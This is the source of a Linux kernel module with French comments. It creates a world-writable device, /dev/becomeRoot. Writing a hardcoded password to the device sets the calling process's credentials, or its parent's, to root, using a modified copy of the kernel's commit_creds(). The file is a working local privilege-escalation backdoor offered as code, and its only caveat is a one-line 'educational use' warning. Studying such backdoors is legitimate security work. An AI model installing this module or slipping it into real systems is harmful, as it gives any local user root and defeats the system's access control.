#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>

//sched.h permet de manipuler les task_structs
#include <linux/sched.h> 

//cred.h nous permet de redéfinir la méthode commits_creds()
#include <linux/cred.h>
//include nécessaire dans le cadre de la redéfinition de commits_creds()
#include <linux/init_task.h>
#include <linux/cn_proc.h>

//fs.h et uacce.h nous permets de définir notre propre méthode read
#include <linux/fs.h>
#include <linux/uacce.h>

// hash.h est nécessaire pour hasher le contenu passer et ainsi permettre à l'utilisateur de passer root
#include <crypto/hash.h>

// à propos de notre module kernl
MODULE_LICENSE("GPL");
MODULE_AUTHOR("GriiseMine");
MODULE_DESCRIPTION("using commit_creds to override credential of specific task_struct");
#define DEVNAME "becomeRoot"


/***************************************************
 * 
 * ici on défini les prototypes de nos fonctions
 * 
****************************************************/


/**
 * @brief Applique un nouvel ensemble de credentials à une tâche spécifique.
 * 
 * Cette fonction est une adaptation de commit_creds() du noyau Linux, mais permet de spécifier
 * une tâche cible au lieu d'appliquer les credentials à la tâche courante.
 * 
 * @param target_task La tâche cible à laquelle les nouveaux credentials doivent être appliqués.
 * @param new Les nouveaux credentials à appliquer.
 * @return int Retourne 0 en cas de succès.
 */
static int commit_creds_to_specific_target(struct task_struct *, struct cred *);

/**
 * @brief Lit des données à partir d'un buffer kernel et les copie dans un buffer de l'espace utilisateur.
 * 
 * Cette fonction est conçue pour être utilisée comme méthode `read` d'un périphérique caractère. 
 * Elle lit des données à partir d'un buffer global `DATA` et les copie dans le buffer de l'espace utilisateur fourni.
 * La lecture prend en compte la position actuelle dans le fichier (indiquée par `loff_t *off`) et met à jour cette position après la lecture.
 * La fonction limite la quantité de données lues à un maximum de 256 caractères à la fois.
 * Si la position de lecture dépasse la longueur des données disponibles, la fonction retourne 0, indiquant la fin du fichier.
 * 
 * @param f Un pointeur vers la structure du fichier associé à l'appel.
 * @param user_buffer Le buffer dans l'espace utilisateur où les données doivent être copiées.
 * @param len La taille du buffer utilisateur, indiquant le nombre maximal de caractères à lire.
 * @param off Un pointeur vers un long offset type (loff_t) qui indique la position actuelle dans le fichier.
 * @return ssize_t Le nombre de caractères effectivement lus et copiés dans le buffer utilisateur, 0 si la fin des données est atteinte, ou -EFAULT en cas d'erreur de copie.
 */
static ssize_t read(struct file *, char __user *, size_t, loff_t *);

/**
 * @brief Change le processus courant en utilisateur root ou le parent du processus courant en fonction du mot de passe fourni.
 * 
 * Cette fonction lit un mot de passe de l'espace utilisateur, le compare avec des valeurs prédéfinies, et change les privilèges du processus en conséquence.
 * Si le mot de passe correspond à "GriiseMine", le processus courant devient root.
 * Si le mot de passe correspond à "GriiseMineParent", le parent du processus courant devient root.
 * Sinon, les données reçues sont stockées dans une variable globale `DATA`.
 * 
 * @param f Un pointeur vers la structure du fichier associé à l'appel.
 * @param user_buffer Le buffer de l'espace utilisateur contenant le mot de passe.
 * @param len La longueur des données dans le buffer de l'espace utilisateur.
 * @param off Un pointeur vers un long offset type (loff_t) qui indique la position dans le fichier.
 * @return ssize_t Le nombre de caractères lus en cas de succès, ou -EFAULT en cas d'erreur.
 */
ssize_t becomeRoot_w_password (struct file *, const char __user *, size_t, loff_t *);

/**
 * @brief Modifie les identifiants d'un processus pour lui donner les privilèges root.
 * 
 * Cette fonction crée une nouvelle structure `cred` et définit tous les identifiants (UID, GID, EUID, etc.) à 0, 
 * ce qui correspond aux privilèges de l'utilisateur root. Elle applique ensuite ces identifiants soit au processus 
 * courant, soit à un processus cible spécifié par la structure `task_struct`.
 *
 * @note Cette fonction est potentiellement dangereuse car elle modifie directement les privilèges d'un processus.
 *       Son utilisation devrait être limitée à des contextes où les implications en matière de sécurité sont pleinement comprises.
 *
 * @param t Un pointeur vers la structure `task_struct` du processus cible. Si NULL, les privilèges du processus courant sont modifiés.
 * @return int Renvoie 0 en cas de succès, ou -ENOMEM si l'allocation de la nouvelle structure `cred` échoue.
 */
static int becomeRoot(struct task_struct *);

// structure file_operations qui permet de définir les implémentations de notre read
static struct file_operations fops = {
    .read = read, // permet au parent de devenir root
	.write = becomeRoot_w_password
};

char DATA[512]; // variable qui permettra de stocker la donner écrite dans le but de la lire
int major; // variable global major qui permet de stocker la major qui nous sera fournis par le système lors de l'ajout du module.
int minor = 0; // nous n'utiliserons pas de mineur on a donc défini cette valeur à zero, elle sera appelé dans MKDEV
dev_t devNo; // permet de combiner major et minor
struct class *pClass;
// fonction qui permet de définir les droits d'accès à notre device, elle sera placé dans pClass->devnode
static char *my_devnode(const struct device *dev, umode_t *mode) {
    if (mode) {
        *mode = 0666; // Permission de lecture et d'écriture rw-rw-rw
    }
    return NULL;
}

/**
 * \brief Cette fonction sert à initialiser le module, elle sera principalement en charge de créer le répertoire /dev/becomeRoot
 * \fn static int __init kmodule_init(void){
*/
static int __init kmodule_init(void){
	printk("--- Chargement du module %s ---\n",DEVNAME); 
	struct device *pDev;

	// allocation d'un numéro de major pour notre device et gestion d'erreur DEVNAME sera le nom présent dans /proc/devices
    major = register_chrdev(0, DEVNAME, &fops);
    if(major<0){
        printk("erreur lors de l'allocation d'un numéro de major %d\n",major);
        return major;
    }

	devNo = MKDEV(major,minor); // major et minor sont stocké dans un dev_t

	// création de sys/class/becomeroot
	pClass = class_create(DEVNAME);
	if (IS_ERR(pClass)) {
		printk(KERN_WARNING "erreur lors de la création de /sys/class/%s\n",DEVNAME);
		unregister_chrdev_region(devNo, 1); // nettoyage des actions précédente
		return -1;
	}
	pClass->devnode = my_devnode; // définir les permissions à l'aide de la fonction précédente

	// création de /dev/becomeroot
	if (IS_ERR(pDev = device_create(pClass, NULL, devNo, NULL, DEVNAME))) {
		printk(KERN_WARNING "erreur lors de la création de /dev/%s\n",DEVNAME);
		// nettoyage des actions précédente
		class_destroy(pClass);
		unregister_chrdev_region(devNo, 1);
		return -1;
	}

    printk("Chargement réussi, \n");
	printk("Attention: Ce module permet un accès root et doit être utilisé à des fins éducatives uniquement. Ne l'utilisez pas pour compromettre la sécurité des systèmes.\n");
    return 0;
}

// fonction en charge de libérer les ressources allouée
static void __exit kmodule_exit(void){
	if (major > 0){
		device_destroy(pClass, devNo);  // Supprimer /dev/becomeRoot
  		class_destroy(pClass);  // Supprimer la classe /sys/class/becomeRoot
  		unregister_chrdev(major, DEVNAME);  // déallocation
    }
    printk("Le module privesc a bien été quitté\n");
}

/**
 * @brief Lit des données à partir d'un buffer kernel et les copie dans un buffer de l'espace utilisateur.
 * 
 * Cette fonction est conçue pour être utilisée comme méthode `read` d'un périphérique caractère. 
 * Elle lit des données à partir d'un buffer global `DATA` et les copie dans le buffer de l'espace utilisateur fourni.
 * La lecture prend en compte la position actuelle dans le fichier (indiquée par `loff_t *off`) et met à jour cette position après la lecture.
 * La fonction limite la quantité de données lues à un maximum de 256 caractères à la fois.
 * Si la position de lecture dépasse la longueur des données disponibles, la fonction retourne 0, indiquant la fin du fichier.
 * 
 * @param f Un pointeur vers la structure du fichier associé à l'appel.
 * @param user_buffer Le buffer dans l'espace utilisateur où les données doivent être copiées.
 * @param len La taille du buffer utilisateur, indiquant le nombre maximal de caractères à lire.
 * @param off Un pointeur vers un long offset type (loff_t) qui indique la position actuelle dans le fichier.
 * @return ssize_t Le nombre de caractères effectivement lus et copiés dans le buffer utilisateur, 0 si la fin des données est atteinte, ou -EFAULT en cas d'erreur de copie.
 */
static ssize_t read(struct file *f, char __user *user_buffer, size_t len, loff_t *off) {
    int read_len;
    int data_len = strlen(DATA);

    // Si la position de lecture est au-delà de la fin des données, retourner 0
    if (*off >= data_len) {
        return 0;
    }

    // Calculer combien de données lire
    read_len = min(len, data_len - *off);

    // Limiter la longueur de lecture à 256 caractères
    if (read_len > 256) {
        read_len = 256;
    }

    // Copier les données vers l'espace utilisateur
    if (copy_to_user(user_buffer, DATA + *off, read_len)) {
        return -EFAULT;
    }

    // Mettre à jour la position de lecture
    *off += read_len;

    return read_len;
}

/**
 * @brief Change le processus courant en utilisateur root ou le parent du processus courant en fonction du mot de passe fourni.
 * 
 * Cette fonction lit un mot de passe de l'espace utilisateur, le compare avec des valeurs prédéfinies, et change les privilèges du processus en conséquence.
 * Si le mot de passe correspond à "GriiseMine", le processus courant devient root.
 * Si le mot de passe correspond à "GriiseMineParent", le parent du processus courant devient root.
 * Sinon, les données reçues sont stockées dans une variable globale `DATA`.
 * 
 * @param f Un pointeur vers la structure du fichier associé à l'appel.
 * @param user_buffer Le buffer de l'espace utilisateur contenant le mot de passe.
 * @param len La longueur des données dans le buffer de l'espace utilisateur.
 * @param off Un pointeur vers un long offset type (loff_t) qui indique la position dans le fichier.
 * @return ssize_t Le nombre de caractères lus en cas de succès, ou -EFAULT en cas d'erreur.
 */
ssize_t becomeRoot_w_password (struct file *f, const char __user *user_buffer, size_t len, loff_t *off){
    char kernel_buffer[512];
	
	int kernel_buffer_size = len; 
    if (kernel_buffer_size > 256){
		kernel_buffer_size = 256; 
	}
 
    if (copy_from_user(kernel_buffer, user_buffer, kernel_buffer_size)){
		return -EFAULT; 
	}
        
    kernel_buffer[kernel_buffer_size] = '\0'; 
    *off += kernel_buffer_size; 
    pr_info("kernel write %s\n", kernel_buffer); 

	// check if pass is correct
	if ( strcmp(kernel_buffer,"GriiseMine") == 0 ){
		printk("becomeRoot_w_password\n");
		becomeRoot(NULL);
	} else if ( strcmp(kernel_buffer,"GriiseMineParent") == 0 ){
		printk("becomeRoot_w_password\n");
		becomeRoot(current->real_parent);
	} else {
		strcpy(DATA,kernel_buffer);
		DATA[strlen(kernel_buffer)] = '\0';
	}
 
    return kernel_buffer_size; 
}

/**
 * @brief Modifie les identifiants d'un processus pour lui donner les privilèges root.
 * 
 * Cette fonction crée une nouvelle structure `cred` et définit tous les identifiants (UID, GID, EUID, etc.) à 0, 
 * ce qui correspond aux privilèges de l'utilisateur root. Elle applique ensuite ces identifiants soit au processus 
 * courant, soit à un processus cible spécifié par la structure `task_struct`.
 *
 * @note Cette fonction est potentiellement dangereuse car elle modifie directement les privilèges d'un processus.
 *       Son utilisation devrait être limitée à des contextes où les implications en matière de sécurité sont pleinement comprises.
 *
 * @param t Un pointeur vers la structure `task_struct` du processus cible. Si NULL, les privilèges du processus courant sont modifiés.
 * @return int Renvoie 0 en cas de succès, ou -ENOMEM si l'allocation de la nouvelle structure `cred` échoue.
 */
static int becomeRoot(struct task_struct *t){

	// creation d'une struct creds
	struct cred *new_creds;
	new_creds = prepare_creds();

	if (!new_creds)
        return -ENOMEM;

    new_creds->uid.val = new_creds->gid.val = 0;
    new_creds->euid.val = new_creds->egid.val = 0;
    new_creds->suid.val = new_creds->sgid.val = 0;
    new_creds->fsuid.val = new_creds->fsgid.val = 0;
	
	if(t ==  NULL){
		commit_creds(new_creds);
	} else {
		commit_creds_to_specific_target(t,new_creds);
	}

	return 0;
}

module_init(kmodule_init);
module_exit(kmodule_exit);


// prototype pour la fonction commit_creds_to_specific_target
static inline int read_cred_subscribers(const struct cred *cred);
static bool cred_cap_issubset(const struct cred *set, const struct cred *subset);
static inline void alter_cred_subscribers(const struct cred *_cred, int n);
static inline void alter_cred_subscribers(const struct cred *_cred, int n);
void set_dumpable(struct mm_struct *mm, int value);
bool dec_rlimit_ucounts(struct ucounts *ucounts, enum rlimit_type type, long v);
inline void proc_id_connector(struct task_struct *task,int which_id){}
void key_fsuid_changed(struct cred *new_cred);
void key_fsgid_changed(struct cred *new_cred);
long inc_rlimit_ucounts(struct ucounts *ucounts, enum rlimit_type type, long v);


/**
 * @brief Applique un nouvel ensemble de credentials à une tâche spécifique.
 * 
 * Cette fonction est une adaptation de commit_creds() du noyau Linux, mais permet de spécifier
 * une tâche cible au lieu d'appliquer les credentials à la tâche courante.
 * 
 * @param target_task La tâche cible à laquelle les nouveaux credentials doivent être appliqués.
 * @param new Les nouveaux credentials à appliquer.
 * @return int Retourne 0 en cas de succès.
 */
int commit_creds_to_specific_target(struct task_struct *target_task, struct cred *new)
{
	int suid_dumpable = true;

    // ...
    // (le reste du code)

    /* La partie modifiée commence ici */
    struct task_struct *task = target_task; // Utilise target_task au lieu de current
    const struct cred *old = task->real_cred; // Récupère les anciens credentials

	/**********************************************
 * 
 * kdebug("commit_creds(%p{%d,%d})", new,
 *	       atomic_read(&new->usage),
 *	       read_cred_subscribers(new));
 * 
**********************************************/

    // ... (le reste du code non modifié)

	BUG_ON(task->cred != old);
#ifdef CONFIG_DEBUG_CREDENTIALS
	BUG_ON(read_cred_subscribers(old) < 2);
	validate_creds(old);
	validate_creds(new);
#endif
	BUG_ON(atomic_read(&new->usage) < 1);

	get_cred(new); /* we will require a ref for the subj creds too */

	/* dumpability changes */
	if (!uid_eq(old->euid, new->euid) ||
	    !gid_eq(old->egid, new->egid) ||
	    !uid_eq(old->fsuid, new->fsuid) ||
	    !gid_eq(old->fsgid, new->fsgid) ||
	    !cred_cap_issubset(old, new)) {
		if (task->mm)
			set_dumpable(task->mm, suid_dumpable);
		task->pdeath_signal = 0;
		/*
		 * If a task drops privileges and becomes nondumpable,
		 * the dumpability change must become visible before
		 * the credential change; otherwise, a __ptrace_may_access()
		 * racing with this change may be able to attach to a task it
		 * shouldn't be able to attach to (as if the task had dropped
		 * privileges without becoming nondumpable).
		 * Pairs with a read barrier in __ptrace_may_access().
		 */
		smp_wmb();
	}

	/* alter the thread keyring */
	if (!uid_eq(new->fsuid, old->fsuid))
		key_fsuid_changed(new);
	if (!gid_eq(new->fsgid, old->fsgid))
		key_fsgid_changed(new);

	/* do it
	 * RLIMIT_NPROC limits on user->processes have already been checked
	 * in set_user().
	 */
	alter_cred_subscribers(new, 2);
	if (new->user != old->user || new->user_ns != old->user_ns)
		inc_rlimit_ucounts(new->ucounts, UCOUNT_RLIMIT_NPROC, 1);
	rcu_assign_pointer(task->real_cred, new);
	rcu_assign_pointer(task->cred, new);
	if (new->user != old->user || new->user_ns != old->user_ns)
		dec_rlimit_ucounts(old->ucounts, UCOUNT_RLIMIT_NPROC, 1);
	alter_cred_subscribers(old, -2);

	/* send notifications */
	if (!uid_eq(new->uid,   old->uid)  ||
	    !uid_eq(new->euid,  old->euid) ||
	    !uid_eq(new->suid,  old->suid) ||
	    !uid_eq(new->fsuid, old->fsuid))
		proc_id_connector(task, PROC_EVENT_UID);

	if (!gid_eq(new->gid,   old->gid)  ||
	    !gid_eq(new->egid,  old->egid) ||
	    !gid_eq(new->sgid,  old->sgid) ||
	    !gid_eq(new->fsgid, old->fsgid))
		proc_id_connector(task, PROC_EVENT_GID);

	/* release the old obj and subj refs both */
	put_cred(old);
	put_cred(old);
	return 0;
}

static inline int read_cred_subscribers(const struct cred *cred)
{
#ifdef CONFIG_DEBUG_CREDENTIALS
	return atomic_read(&cred->subscribers);
#else
	return 0;
#endif
}

static bool cred_cap_issubset(const struct cred *set, const struct cred *subset)
{
	const struct user_namespace *set_ns = set->user_ns;
	const struct user_namespace *subset_ns = subset->user_ns;

	/* If the two credentials are in the same user namespace see if
	 * the capabilities of subset are a subset of set.
	 */
	if (set_ns == subset_ns)
		return cap_issubset(subset->cap_permitted, set->cap_permitted);

	/* The credentials are in a different user namespaces
	 * therefore one is a subset of the other only if a set is an
	 * ancestor of subset and set->euid is owner of subset or one
	 * of subsets ancestors.
	 */
	for (;subset_ns != &init_user_ns; subset_ns = subset_ns->parent) {
		if ((set_ns == subset_ns->parent)  &&
		    uid_eq(subset_ns->owner, set->euid))
			return true;
	}

	return false;
}

static inline void alter_cred_subscribers(const struct cred *_cred, int n)
{
#ifdef CONFIG_DEBUG_CREDENTIALS
	struct cred *cred = (struct cred *) _cred;

	atomic_add(n, &cred->subscribers);
#endif
}

void set_dumpable(struct mm_struct *mm, int value)
{
	if (WARN_ON((unsigned)value > SUID_DUMP_ROOT))
		return;

	set_mask_bits(&mm->flags, MMF_DUMPABLE_MASK, value);
}

bool dec_rlimit_ucounts(struct ucounts *ucounts, enum rlimit_type type, long v)
{
	struct ucounts *iter;
	long new = -1; /* Silence compiler warning */
	for (iter = ucounts; iter; iter = iter->ns->ucounts) {
		long dec = atomic_long_sub_return(v, &iter->rlimit[type]);
		WARN_ON_ONCE(dec < 0);
		if (iter == ucounts)
			new = dec;
	}
	return (new == 0);
}

void key_fsuid_changed(struct cred *new_cred)
{
	/* update the ownership of the thread keyring */
	if (new_cred->thread_keyring) {
		down_write(&new_cred->thread_keyring->sem);
		new_cred->thread_keyring->uid = new_cred->fsuid;
		up_write(&new_cred->thread_keyring->sem);
	}
}

void key_fsgid_changed(struct cred *new_cred)
{
	/* update the ownership of the thread keyring */
	if (new_cred->thread_keyring) {
		down_write(&new_cred->thread_keyring->sem);
		new_cred->thread_keyring->gid = new_cred->fsgid;
		up_write(&new_cred->thread_keyring->sem);
	}
}

long inc_rlimit_ucounts(struct ucounts *ucounts, enum rlimit_type type, long v)
{
	struct ucounts *iter;
	long max = LONG_MAX;
	long ret = 0;

	for (iter = ucounts; iter; iter = iter->ns->ucounts) {
		long new = atomic_long_add_return(v, &iter->rlimit[type]);
		if (new < 0 || new > max)
			ret = LONG_MAX;
		else if (iter == ucounts)
			ret = new;
		max = get_userns_rlimit_max(iter->ns, type);
	}
	return ret;
}
